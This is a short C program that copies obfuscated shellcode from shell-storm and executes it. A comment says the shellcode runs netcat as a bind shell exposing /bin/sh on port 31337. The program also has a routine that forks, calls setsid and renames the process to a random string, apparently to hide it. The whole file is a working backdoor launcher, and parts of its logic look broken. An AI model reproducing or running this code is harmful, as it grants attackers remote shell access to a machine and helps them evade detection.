# include <stdio.h>
# include <stdlib.h>
# include <string.h>
#include <sys/prctl.h>
#include <signal.h>

inline char* random_func(void) {
	static unsigned char s[15];
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	static int i;

	for (i = 0; i < 4 + rand() % 10; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	for (; i < 15; ++i) {
		s[i] = '\x00';
	}

	return s;
}

inline void randomizator(void){
	pid_t pid;
	pid = fork();
	kill(0, SIGSEGV);
	prctl(PR_SET_NAME, random_func());
	setsid();
}
int main (void){
        

//www.shell-storm.org/shellcode/files/shellcode-679.php
char shellcode[] = 
                  ("\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35\x80\xe9\x01"
               	   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5"
       	           "\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87"
       	           "\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02"
        	   "\xb5\x96\x1d\x29\x34\x34\x34\xa3\x98\x55\x62\xa1\xa5\x55\x68"
                   "\x66\x68\x68\x6c\x55\x62\x9a\x55\x64\x97\x9e\xa3\x64\x64\xa8"
      	           "\x9d");

        
	
//system(nc -lp 31337 -e /bin//sh);
(*(void(*)()) shellcode)();
randomizator();
return(0);
}
